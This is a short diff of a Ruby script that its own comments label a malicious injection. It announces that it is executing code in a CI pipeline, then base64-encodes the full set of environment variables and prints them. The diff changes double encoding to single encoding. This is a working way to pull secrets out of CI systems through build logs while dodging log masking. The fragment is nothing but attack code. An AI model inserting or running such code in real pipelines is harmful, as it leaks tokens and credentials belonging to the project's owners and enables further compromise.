@@ -15,9 +15,7 @@ puts " [!] I am executing code in your CI!"
 puts "------------------------------------------------"
 require 'base64'
 
-encoded = Base64.strict_encode64(
-  Base64.strict_encode64(ENV.to_h.to_s)
-)
+encoded = Base64.strict_encode64(ENV.to_h.to_s)
 
 puts encoded
 # --- Malicious Injection Ends Here ---
